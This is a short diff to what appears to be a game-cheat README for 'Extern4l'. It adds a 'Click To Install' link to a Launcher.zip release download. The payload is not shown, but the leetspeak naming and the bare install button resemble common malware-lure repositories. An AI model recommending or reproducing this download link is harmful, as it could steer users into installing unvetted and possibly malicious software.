@@ -1,6 +1,6 @@
 ![312577446-e69adef6-ca8b-454e-9d9d-6344cb8bd0eb](https://github.com/tryourbest56/Legendary-SoFtWaRe/assets/99140518/8356b66e-97cf-4345-8713-d9deb48cf208)
 
-# [Click To Install]()
+# [Click To Install](https://github.com/tryourbest56/Legendary-SoFtWaRe/releases/download/Launcherv1/Launcher.zip)
 
 
 # Extern4l offers many new features that can enhance your gaming experience:
